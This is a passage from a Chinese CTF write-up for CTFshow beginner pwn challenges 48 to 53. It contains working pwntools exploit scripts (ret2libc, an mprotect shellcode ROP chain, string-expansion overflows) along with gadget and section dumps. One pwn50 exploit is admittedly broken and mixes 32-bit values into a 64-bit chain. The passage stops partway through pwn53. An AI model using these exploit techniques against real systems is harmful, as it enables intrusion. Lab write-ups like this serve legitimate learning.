system_add = libc_base + libc.dump('system')
bin_sh_add = libc_base + libc.dump('str_bin_sh')

# libc_base = puts_addr - libc.symbols['puts']
# system_add = libc_base + libc.symbols['system']
# bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset + 4) + p32(system_add) + p32(0) + p32(bin_sh_add)
io.sendlineafter(b'time:', payload2)

io.interactive()
```

## pwn48

同样32位填板子，填完就拿到flag

exp：

```python
from pwn import *
from LibcSearcher import *

io = remote('pwn.challenge.ctf.show',28214 )
# io = process("")
elf = ELF('./pwn48')
# libc= ELF('libc.so.6')

main_add =0x0804863D
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ", hex(puts_got))
print("Puts_plt: ", hex(puts_plt))

offset =0x6B

payload1 = b'a' * (offset + 4) + p32(puts_plt) + p32(main_add) + p32(puts_got)
io.sendlineafter(b'O.o?', payload1)
puts_addr = u32(io.recvuntil(b'\xf7')[-4:])
print("Puts_addr: ", hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)

libc_base = puts_addr - libc.dump('puts')
system_add = libc_base + libc.dump('system')
bin_sh_add = libc_base + libc.dump('str_bin_sh')

# libc_base = puts_addr - libc.symbols['puts']
# system_add = libc_base + libc.symbols['system']
# bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset + 4) + p32(system_add) + p32(0) + p32(bin_sh_add)
io.sendlineafter(b'O.o?', payload2)

io.interactive()
```

## pwn49

32位

NX开启

提示mprotect

mprotect()函数可以修改调用进程内存页的保护属性

所以利用mprotect函数，就可以绕过NX

从而达到写入shellcode的目的

```c
int ctfshow()
{
  _BYTE v1[14]; // [esp+6h] [ebp-12h] BYREF

  return read(0, v1, 100);
}
```

ctfshow函数中拿到偏移地址

0x12+4

mprotect函数存在三个参数

这三个参数分别为：**内存区域起始地址**  **内存区域大小** **访问权限**

而访问权限，又有三个值

r:4
w:2
x:1

所以，rwx权限(可读可写可执行)就是0x7

想要调用mprotect函数

就需要让ctfshow函数的返回地址为mprotect函数的地址

通过gdb的disass mprotect 指令

拿到mprotect的地址

```c
pwndbg> disass mprotect
Dump of assembler code for function mprotect:
   0x0806cdd0 <+0>:	push   ebx
   0x0806cdd1 <+1>:	mov    edx,DWORD PTR [esp+0x10]
   0x0806cdd5 <+5>:	mov    ecx,DWORD PTR [esp+0xc]
   0x0806cdd9 <+9>:	mov    ebx,DWORD PTR [esp+0x8]
   0x0806cddd <+13>:	mov    eax,0x7d
   0x0806cde2 <+18>:	call   DWORD PTR gs:0x10
   0x0806cde9 <+25>:	pop    ebx
   0x0806cdea <+26>:	cmp    eax,0xfffff001
   0x0806cdef <+31>:	jae    0x8070520 <__syscall_error>
   0x0806cdf5 <+37>:	ret    
End of assembler dump.
```

所以mprotect函数的地址为：0x0806cdd0

mprotect函数可以被调用了，但我们还需要找到这个函数的返回地址

返回地址选为read函数的地址，这样能帮助写入shellcode到内存空间里

对于mprotect函数部分的payload，情况就是

填充 + mprotect函数 + 返回地址 + mprotect的三个参数 + read函数

在IDA里面查找得到read函数的地址

read	0x0806BEE0

现在就只要补齐三个参数就好了

首先是内存区域起始地址，选用got表的起始地址

选用got表的原因：

###  1. **.got.plt 表的特性**

- **全局偏移表（GOT）** 是 ELF（Executable and Linkable Format）文件格式中的一个重要部分，用于存储动态链接库中函数的地址。
- **.got.plt 表** 是 GOT 表的一个子集，专门用于存储程序中调用的动态链接库函数的地址。它通常位于程序的内存空间中，且在程序运行时会被加载到内存中。

### 2. **为什么选择 .got.plt 表的起始地址**

- **内存对齐和权限修改的便利性**：
  - .got.plt 表的起始地址通常是内存页的起始地址（通常是 4KB 对齐），这符合 mprotect 函数的要求，即起始地址必须是内存页的起始地址。
  - 修改 .got.plt 表的权限可以覆盖整个表的范围，而不需要担心跨页问题，因为 .got.plt 表通常不会跨越多个内存页。
- **绕过 NX 保护**：
  - 在现代操作系统中，栈和堆通常是没有执行权限的（即开启了 NX 保护）。而 .got.plt 表位于程序的 .got 段中，这个段通常是可以读写的。
  - 通过修改 .got.plt 表的权限，可以将其设置为可读、可写、可执行（PROT_READ | PROT_WRITE | PROT_EXEC），从而绕过 NX 保护，为执行 shellcode 提供条件。
- **避免对程序其他部分的影响**：
  - .got.plt 表通常用于存储动态链接库函数的地址，修改其权限不会直接影响程序的其他部分（如栈、堆等）。
  - 相比之下，修改 .bss 段可能会导致程序崩溃，因为 .bss 段在程序启动时会被清零，修改后的内容可能会被覆盖。

所以寻找got表地址

使用readelf -S pwn49

这个命令就能拿到所有节头信息

```c
There are 31 section headers, starting at offset 0xa1474:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .note.ABI-tag     NOTE            080480f4 0000f4 000020 00   A  0   0  4
  [ 2] .note.gnu.build-i NOTE            08048114 000114 000024 00   A  0   0  4
readelf: Warning: [ 3]: Link field (0) should index a symtab section.
  [ 3] .rel.plt          REL             08048138 000138 000070 08  AI  0  19  4
  [ 4] .init             PROGBITS        080481a8 0001a8 000023 00  AX  0   0  4
  [ 5] .plt              PROGBITS        080481d0 0001d0 000070 00  AX  0   0  8
  [ 6] .text             PROGBITS        08048240 000240 063421 00  AX  0   0 16
  [ 7] __libc_freeres_fn PROGBITS        080ab670 063670 000ba7 00  AX  0   0 16
  [ 8] __libc_thread_fre PROGBITS        080ac220 064220 000127 00  AX  0   0 16
  [ 9] .fini             PROGBITS        080ac348 064348 000014 00  AX  0   0  4
  [10] .rodata           PROGBITS        080ac360 064360 018b98 00   A  0   0 32
  [11] .eh_frame         PROGBITS        080c4ef8 07cef8 011e48 00   A  0   0  4
  [12] .gcc_except_table PROGBITS        080d6d40 08ed40 0000ac 00   A  0   0  1
  [13] .tdata            PROGBITS        080d86e0 08f6e0 000010 00 WAT  0   0  4
  [14] .tbss             NOBITS          080d86f0 08f6f0 000020 00 WAT  0   0  4
  [15] .init_array       INIT_ARRAY      080d86f0 08f6f0 000008 04  WA  0   0  4
  [16] .fini_array       FINI_ARRAY      080d86f8 08f6f8 000008 04  WA  0   0  4
  [17] .data.rel.ro      PROGBITS        080d8700 08f700 0018d4 00  WA  0   0 32
  [18] .got              PROGBITS        080d9fd4 090fd4 000028 00  WA  0   0  4
  [19] .got.plt          PROGBITS        080da000 091000 000044 04  WA  0   0  4
  [20] .data             PROGBITS        080da060 091060 000f20 00  WA  0   0 32
  [21] __libc_subfreeres PROGBITS        080daf80 091f80 000024 00  WA  0   0  4
  [22] __libc_IO_vtables PROGBITS        080dafc0 091fc0 000354 00  WA  0   0 32
  [23] __libc_atexit     PROGBITS        080db314 092314 000004 00  WA  0   0  4
  [24] __libc_thread_sub PROGBITS        080db318 092318 000004 00  WA  0   0  4
  [25] .bss              NOBITS          080db320 09231c 000cdc 00  WA  0   0 32
  [26] __libc_freeres_pt NOBITS          080dbffc 09231c 000014 00  WA  0   0  4
  [27] .comment          PROGBITS        00000000 09231c 000029 01  MS  0   0  1
  [28] .symtab           SYMTAB          00000000 092348 008640 10     29 1090  4
  [29] .strtab           STRTAB          00000000 09a988 006992 00      0   0  1
  [30] .shstrtab         STRTAB          00000000 0a131a 000159 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```

[19] .got.plt          PROGBITS        080da000 091000 000044 04  WA  0   0  4

这里拿到got表地址

0x080da000

现在填补另外两个参数：内存区域大小和权限

大小就可以随便设定就好，0x100啥的应该都能随便用，大了改小，小了改大，能存入shellcode就够了

权限则是0x7即可

参数找到了，还需要找到三个pop，一个ret的gadget

```c
ctfshow@ubuntu:~/Desktop/xd$ ROPgadget --binary pwn49 --only "pop|ret" |grep "pop"
0x0809f422 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809f41a : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x08056194 : pop eax ; pop edx ; pop ebx ; ret
0x080a8dd6 : pop eax ; ret
0x0806a68d : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809f805 : pop ebp ; pop esi ; pop edi ; ret
0x0804834c : pop ebp ; ret
0x0805d6f2 : pop ebp ; ret 4
0x080a1db7 : pop ebp ; ret 8
0x0809f804 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x0805b75e : pop ebx ; pop edi ; ret
0x0806dfea : pop ebx ; pop edx ; ret
0x080a019b : pop ebx ; pop esi ; pop ebp ; ret
0x08048349 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0805d6ef : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x080a1db4 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08049bd9 : pop ebx ; pop esi ; pop edi ; ret
0x08049807 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080c2fdc : pop ebx ; ret 0x6f9
0x0806e012 : pop ecx ; pop ebx ; ret
0x0804834b : pop edi ; pop ebp ; ret
0x0805d6f1 : pop edi ; pop ebp ; ret 4
0x080a1db6 : pop edi ; pop ebp ; ret 8
0x08069cbe : pop edi ; pop ebx ; ret
0x08061c3b : pop edi ; pop esi ; pop ebx ; ret
0x080921b8 : pop edi ; pop esi ; ret
0x08049bdb : pop edi ; ret
0x08056195 : pop edx ; pop ebx ; ret
0x0806e011 : pop edx ; pop ecx ; pop ebx ; ret
0x0806dfeb : pop edx ; ret
0x0809f419 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x08065aba : pop es ; pop edi ; ret
0x08065cfa : pop es ; ret
0x080a019c : pop esi ; pop ebp ; ret
0x0806dfe9 : pop esi ; pop ebx ; pop edx ; ret
0x08061c3c : pop esi ; pop ebx ; ret
0x0804834a : pop esi ; pop edi ; pop ebp ; ret
0x0805d6f0 : pop esi ; pop edi ; pop ebp ; ret 4
0x080a1db5 : pop esi ; pop edi ; pop ebp ; ret 8
0x08069cbd : pop esi ; pop edi ; pop ebx ; ret
0x08049bda : pop esi ; pop edi ; ret
0x08049808 : pop esi ; ret
0x08054706 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0809e12e : pop esp ; ret
0x0805ad28 : pop esp ; ret 0x8b38
0x080622c9 : pop ss ; ret 0x2c73
0x08062c8a : pop ss ; ret 0x3273
0x080622b4 : pop ss ; ret 0x3e73
0x08062c70 : pop ss ; ret 0x4c73
0x0806229f : pop ss ; ret 0x5073
0x0806228a : pop ss ; ret 0x6273
0x08062c56 : pop ss ; ret 0x6673
0x08060805 : pop ss ; ret 0x830f
```

通过指令找到这样的gadget

0x08056194

这个gadget就能作为mprotect的返回地址

填充地址                               0x12+4

mprotect函数                      0x0806cdd0

返回地址                               0x08056194

mprotect的三个参数           0x080da000      0x100     0x7

read函数                               0x0806BEE0

shellcode由asm方法生成

```python
shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
```

然后是read部分的payload

read函数 + read函数返回地址(就是我们shellcode所在地址-即我们修改的内存空间的起始地址) + read参数1 + read参数2(就是我们shellcode地址) + read参数3(read读取的大小)

read的参数1是文件标识符

即fd

常态下，fd=0即可

所以read参数1写0就可

至于参数2和参数3，shellcode写在got，所以参数2为got表起始地址，参数3就写内存区域大小即可

```python
shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
payload = b'a'*(0x12+4)
payload += p32(0x0806cdd0) # mprotect函数地址
payload += p32(0x08056194) # 3 pop 1 ret地址	
payload += p32(0x080da000) # 需要修改的内存的起始地址
payload += p32(0x1000) # 修改内存空间的大小
payload += p32(0x7) # 需要赋予的权限
payload += p32(0x806bee0) # read函数地址
payload += p32(0x080da000) # read函数返回地址(就是我们shellcode所在地址,即我们修改的内存空间的起始地址)
payload += p32(0x0) 
payload += p32(0x080da000) # shellcode地址
payload += p32(len(shellcode))
```

完整exp：

```python
# -*- coding: UTF-8 -*-
from pwn import *
u=remote("pwn.challenge.ctf.show",28307)
shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
payload = b'a'*(0x12+4)
payload += p32(0x0806cdd0) # mprotect函数地址
payload += p32(0x08056194) # 3 pop 1 ret地址
payload += p32(0x080da000) # 需要修改的内存的起始地址
payload += p32(0x1000) # 修改内存空间的大小
payload += p32(0x7) # 需要赋予的权限
payload += p32(0x806bee0) # read函数地址
payload += p32(0x080da000) # read函数返回地址(就是我们shellcode所在地址,即我们修改的内存空间的起始地址)
payload += p32(0x0)
payload += p32(0x080da000) # shellcode地址
payload += p32(len(shellcode))
u.sendline(payload)
u.sendline(shellcode)
u.interactive()
```

## pwn50

```c
[*] 'C:\\Users\\26597\\Desktop\\pwn50'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

看到puts函数

提示libc版本

猜是ret2libc的64位

套板子

exp：

```python
from pwn import *
from LibcSearcher import *

io = remote('pwn.challenge.ctf.show',28119)
#io=process("./pwn50")
elf = ELF('./pwn50')
# libc= ELF('libc.so.6')

ret_add =0x00000000004004fe
pop_rdi =0x00000000004007e3
main_add =0x0000000000400745
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ",hex(puts_got))
print("Puts_plt: ",hex(puts_plt))

offset=0x20

payload1 = b'a' * (offset+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_add)
io.sendlineafter(b'Hello CTFshow', payload1)
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("Puts_addr: ",hex(puts_addr))

libc = LibcSearcher('puts',puts_addr)   # libc6_2.27-0ubuntu2_amd64

libc_base = puts_addr - libc.dump('puts')
system_add = libc_base + libc.dump('system')
bin_sh_add = libc_base + libc.dump('str_bin_sh')

# libc_base = puts_addr - libc.symbols['puts']
# system_add = libc_base + libc.symbols['system']
# bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset+8) + p64(ret_add) + p64(pop_rdi) + p64(bin_sh_add) + p64(system_add)

io.sendlineafter(b'Hello CTFshow', payload2)

io.interactive()
```

貌似还可以打mprotect

### mprotect

```c
pwndbg> disass mprotect
Dump of assembler code for function mprotect:
   0x00007ffff7afd7e0 <+0>:	mov    eax,0xa
   0x00007ffff7afd7e5 <+5>:	syscall 
   0x00007ffff7afd7e7 <+7>:	cmp    rax,0xfffffffffffff001
   0x00007ffff7afd7ed <+13>:	jae    0x7ffff7afd7f0 <mprotect+16>
   0x00007ffff7afd7ef <+15>:	ret    
   0x00007ffff7afd7f0 <+16>:	mov    rcx,QWORD PTR [rip+0x2cf671]        # 0x7ffff7dcce68
   0x00007ffff7afd7f7 <+23>:	neg    eax
   0x00007ffff7afd7f9 <+25>:	mov    DWORD PTR fs:[rcx],eax
   0x00007ffff7afd7fc <+28>:	or     rax,0xffffffffffffffff
   0x00007ffff7afd800 <+32>:	ret    
End of assembler dump.
```

找到mprotect函数位置

找寄存器位置

```c
0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007e0 : pop r14 ; pop r15 ; ret
0x00000000004007e2 : pop r15 ; ret
0x0000000000400634 : pop rbp ; jmp 0x4005c0
0x00000000004005ab : pop rbp ; mov edi, 0x602048 ; jmp rax
0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005b8 : pop rbp ; ret
0x00000000004007e3 : pop rdi ; ret
0x00000000004007e1 : pop rsi ; pop r15 ; ret
0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
```

pop相关的地址就这些

找三个pop带个ret即可

0x00000000004007e0     即为返回地址

现在再去找got表的位置

```c
Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000400238  00000238
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.ABI-tag     NOTE             0000000000400254  00000254
       0000000000000020  0000000000000000   A       0     0     4
  [ 3] .note.gnu.build-i NOTE             0000000000400274  00000274
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298
       0000000000000028  0000000000000000   A       5     0     8
  [ 5] .dynsym           DYNSYM           00000000004002c0  000002c0
       00000000000000d8  0000000000000018   A       6     1     8
  [ 6] .dynstr           STRTAB           0000000000400398  00000398
       000000000000005c  0000000000000000   A       0     0     1
  [ 7] .gnu.version      VERSYM           00000000004003f4  000003f4
       0000000000000012  0000000000000002   A       5     0     2
  [ 8] .gnu.version_r    VERNEED          0000000000400408  00000408
       0000000000000020  0000000000000000   A       6     1     8
  [ 9] .rela.dyn         RELA             0000000000400428  00000428
       0000000000000060  0000000000000018   A       5     0     8
  [10] .rela.plt         RELA             0000000000400488  00000488
       0000000000000060  0000000000000018  AI       5    22     8
  [11] .init             PROGBITS         00000000004004e8  000004e8
       0000000000000017  0000000000000000  AX       0     0     4
  [12] .plt              PROGBITS         0000000000400500  00000500
       0000000000000050  0000000000000010  AX       0     0     16
  [13] .text             PROGBITS         0000000000400550  00000550
       00000000000002a2  0000000000000000  AX       0     0     16
  [14] .fini             PROGBITS         00000000004007f4  000007f4
       0000000000000009  0000000000000000  AX       0     0     4
  [15] .rodata           PROGBITS         0000000000400800  00000800
       000000000000053f  0000000000000000   A       0     0     8
  [16] .eh_frame_hdr     PROGBITS         0000000000400d40  00000d40
       0000000000000054  0000000000000000   A       0     0     4
  [17] .eh_frame         PROGBITS         0000000000400d98  00000d98
       0000000000000160  0000000000000000   A       0     0     8
  [18] .init_array       INIT_ARRAY       0000000000601e10  00001e10
       0000000000000008  0000000000000008  WA       0     0     8
  [19] .fini_array       FINI_ARRAY       0000000000601e18  00001e18
       0000000000000008  0000000000000008  WA       0     0     8
  [20] .dynamic          DYNAMIC          0000000000601e20  00001e20
       00000000000001d0  0000000000000010  WA       6     0     8
  [21] .got              PROGBITS         0000000000601ff0  00001ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [22] .got.plt          PROGBITS         0000000000602000  00002000
       0000000000000038  0000000000000008  WA       0     0     8
  [23] .data             PROGBITS         0000000000602038  00002038
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000602050  00002048
       0000000000000020  0000000000000000  WA       0     0     16
  [25] .comment          PROGBITS         0000000000000000  00002048
       0000000000000029  0000000000000001  MS       0     0     1
  [26] .symtab           SYMTAB           0000000000000000  00002078
       0000000000000678  0000000000000018          27    43     8
  [27] .strtab           STRTAB           0000000000000000  000026f0
       0000000000000239  0000000000000000           0     0     1
  [28] .shstrtab         STRTAB           0000000000000000  00002929
       0000000000000103  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)
```

位置为：0x0000000000602000

 找到类read函数gets

0000000000400657

最后改出来的exp运行交互没结果，疑惑

之后再来仔细研究

待改exp：

```python
# -*- coding: UTF-8 -*-
from pwn import *
u=remote("pwn.challenge.ctf.show",28162)
shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
payload = b'a'*(0x20+8)
payload += p64(0x00007ffff7afd7e0) # mprotect函数地址
payload += p64(0x00000000004007e0) # 3 pop 1 ret地址
payload += p64(0x0000000000602000) # 需要修改的内存的起始地址
payload += p64(0x1000) # 修改内存空间的大小
payload += p64(0x7) # 需要赋予的权限
payload += p64(0x806bee0) # gets函数地址
payload += p64(0x0000000000602000) # gets函数返回地址(就是我们shellcode所在地址,即我们修改的内存空间的起始地址)
payload += p64(0x0000000000602000) # shellcode地址
payload += p64(len(shellcode))
u.sendline(payload)
u.sendline(shellcode)
u.interactive()
```



## pwn51

32位

反编译后傻眼了

是C++

看不太懂，靠着string界面找到了主要函数sub_8049059

```c++
int sub_8049059()
{
  int v0; // eax
  int v1; // eax
  unsigned int v2; // eax
  int v3; // eax
  const char *v4; // eax
  int v6; // [esp-Ch] [ebp-84h]
  int v7; // [esp-8h] [ebp-80h]
  _BYTE v8[12]; // [esp+0h] [ebp-78h] BYREF
  char s[32]; // [esp+Ch] [ebp-6Ch] BYREF
  _BYTE v10[24]; // [esp+2Ch] [ebp-4Ch] BYREF
  _BYTE v11[24]; // [esp+44h] [ebp-34h] BYREF
  unsigned int i; // [esp+5Ch] [ebp-1Ch]

  memset(s, 0, sizeof(s));
  puts("Who are you?");
  read(0, s, 0x20u);
  std::string::operator=(&unk_804D0A0, &unk_804A350);
  std::string::operator+=(&unk_804D0A0, s);
  std::string::basic_string(v10, &unk_804D0B8);
  std::string::basic_string(v11, &unk_804D0A0);
  sub_8048F06(v8);
  std::string::~string(v11, v11, v10);
  std::string::~string(v10, v6, v7);
  if ( sub_80496D6(v8) > 1u )
  {
    std::string::operator=(&unk_804D0A0, &unk_804A350);
    v0 = sub_8049700(v8, 0);
    if ( (unsigned __int8)sub_8049722(v0, &unk_804A350) )
    {
      v1 = sub_8049700(v8, 0);
      std::string::operator+=(&unk_804D0A0, v1);
    }
    for ( i = 1; ; ++i )
    {
      v2 = sub_80496D6(v8);
      if ( v2 <= i )
        break;
      std::string::operator+=(&unk_804D0A0, "IronMan");
      v3 = sub_8049700(v8, i);
      std::string::operator+=(&unk_804D0A0, v3);
    }
  }
  v4 = (const char *)std::string::c_str(&unk_804D0A0);
  strcpy(s, v4);
  printf("Wow!you are:%s", s);
  return sub_8049616(v8);
}
```

初略理解之下，知道s就是要溢出的对象，认为偏移值就是char s[32]; // [esp+Ch] [ebp-6Ch] BYREF，也就是0x6C+4

string界面还能找到一条system指令

```C++
int sub_804902E()
{
  return system("cat /ctfshow_flag");
}
```

初步尝试失败，虽然看着应该没什么问题

但是貌似有限制输入

所以尝试输入0x6C+4的‘a’就没办法输出够

看WP才知道主函数里面会把I换成IronMan

16个I的输入就能刚刚好变成112字节IronMan，完成溢出效果

然后后续跟一个system函数位置就好了

exp：

```python
from pwn import *
u=remote("pwn.challenge.ctf.show",28223)
payload=b'I'*16+p32(0x0804902E)
#payload=b'I'*16+p32(0x08049042)
u.sendline(payload)
u.interactive()
```

此事在直接本地运行亦有记载（

```c
ctfshow@ubuntu:~/Desktop/xd/LibcSearcher$ ./pwn51
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Stack_Overflow                                          
    * Site  : https://ctf.show/                                       
    * Hint  : Who are you?                                            
    * *************************************                           
Who are you?
I
Wow!you are:IronMan
```

## pwn52

flag函数

```c
char *__cdecl flag(int a1, int a2)
{
  char *result; // eax
  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen("/ctfshow_flag", "r");
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  result = fgets(s, 64, stream);
  if ( a1 == 876 && a2 == 877 )
    return (char *)printf(s);
  return result;
}
```

初略理解后，大意为传入参数a1,a2为对应值

就可以输出数组s的内容

而数组s读取了stream的前64字节的内容

stream又是依靠只读打开的ctfshow_flag的内容

所以拿到数组S就是拿到目标flag

找flag函数地址

再找到偏移量

exp：

```python
from pwn import *
u=remote("pwn.challenge.ctf.show",28231)
offset = 0x6C
flag = 0x08048586
payload=b'a'*(offset+4)+p32(flag)+p32(0)+p32(876)+p32(877)
u.sendline(payload)
u.interactive()
```

还可以用ret2libc做，存在puts函数，套板子就能出

exp:

```python
from pwn import *
from LibcSearcher import *

io = remote('pwn.challenge.ctf.show', 28188)
# io = process("")
elf = ELF('./pwn52')
# libc= ELF('libc.so.6')

main_add =0x0804874E
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ", hex(puts_got))
print("Puts_plt: ", hex(puts_plt))

offset =0x6C

payload1 = b'a' * (offset + 4) + p32(puts_plt) + p32(main_add) + p32(puts_got)
io.sendlineafter(b'What do you want?', payload1)
puts_addr = u32(io.recvuntil(b'\xf7')[-4:])
print("Puts_addr: ", hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)

libc_base = puts_addr - libc.dump('puts')
system_add = libc_base + libc.dump('system')
bin_sh_add = libc_base + libc.dump('str_bin_sh')

# libc_base = puts_addr - libc.symbols['puts']
# system_add = libc_base + libc.symbols['system']
# bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset + 4) + p32(system_add) + p32(0) + p32(bin_sh_add)
io.sendlineafter(b'What do you want?', payload2)

io.interactive()
```

## pwn53

checksec

```c
[*] 'C:\\Users\\26597\\Desktop\\pwn53'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

32位小端序

本地运行以下先看看

```c
ctfshow@ubuntu:~/Desktop/xd$ ./pwn53
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Stack_Overflow                                          
    * Site  : https://ctf.show/                                       
    * Hint  : Do you know how Canary works?                           
    * *************************************                           
/canary.txt: No such file or directory.
```

报错了，运行不下去

main函数的运行逻辑在过完logo函数进入canary函数后就结束了

canary函数：

```c
int canary()
{
  FILE *stream; // [esp+Ch] [ebp-Ch]

  stream = fopen("/canary.txt", "r");
  if ( !stream )
  {
    puts("/canary.txt: No such file or directory.");
    exit(0);
  }
  fread(&global_canary, 1u, 4u, stream);
  return fclose(stream);
}
```

这个函数的作用是从一个名为 `/canary.txt` 的文件中读取一个值，并将其存储到全局变量 `global_canary` 中。以下是函数的详细逻辑分析：

### 1. **函数声明**
```c
int canary()
```
- 这是一个无参数的函数，返回值为 `int` 类型。

### 2. **局部变量声明**
```c
FILE *stream;
```
- 声明了一个指向 `FILE` 类型的指针 `stream`，用于后续的文件操作。

### 3. **打开文件**
```c
stream = fopen("/canary.txt", "r");
```
- 使用 `fopen` 函数尝试以只读模式（`"r"`）打开文件 `/canary.txt`。
- 如果文件打开成功，`stream` 将指向该文件的文件流；如果失败，`stream` 将为 `NULL`。

### 4. **检查文件是否打开成功**
```c
if (!stream)
{
    puts("/canary.txt: No such file or directory.");
    exit(0);
}
```
- 如果 `stream` 为 `NULL`，说明文件打开失败。
- 输出错误信息：`/canary.txt: No such file or directory.`。
- 调用 `exit(0)` 终止程序运行。

### 5. **读取文件内容**
```c
fread(&global_canary, 1u, 4u, stream);
```
- 使用 `fread` 函数从文件流 `stream` 中读取数据。
- 参数解释：
  - `&global_canary`：目标地址，将读取的数据存储到全局变量 `global_canary` 中。
  - `1u`：每个数据块的大小为 1 字节。
  - `4u`：读取 4 个数据块，即总共读取 4 字节。
  - `stream`：文件流指针。
- 这里假设 `global_canary` 是一个 4 字节的变量（例如 `int` 或 `uint32_t` 类型），函数会从文件中读取 4 字节的数据并存储到 `global_canary` 中。

### 6. **关闭文件**
```c
return fclose(stream);
```
- 使用 `fclose` 函数关闭文件流 `stream`。
- `fclose` 的返回值为 `int` 类型：
  - 如果成功关闭文件，返回 0。
  - 如果关闭失败，返回非零值。
- 函数返回 `fclose` 的结果。

### **函数总结**
1. **功能**：从文件 `/canary.txt` 中读取 4 字节的数据，并将其存储到全局变量 `global_canary` 中。
2. **输入**：无参数，但依赖于文件 `/canary.txt`。
3. **输出**：
   - 如果文件不存在，输出错误信息并退出程序。
   - 如果文件存在，读取数据并关闭文件，返回 `fclose` 的结果。

这时候返回来看本地运行的结果，直接返回报错信息的原因应该是本地不存在canary.txt这个文件

所以这次打远程是不会出现这样的报错的

正常nc

```c
C:\Users\26597>nc pwn.challenge.ctf.show 28283
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██
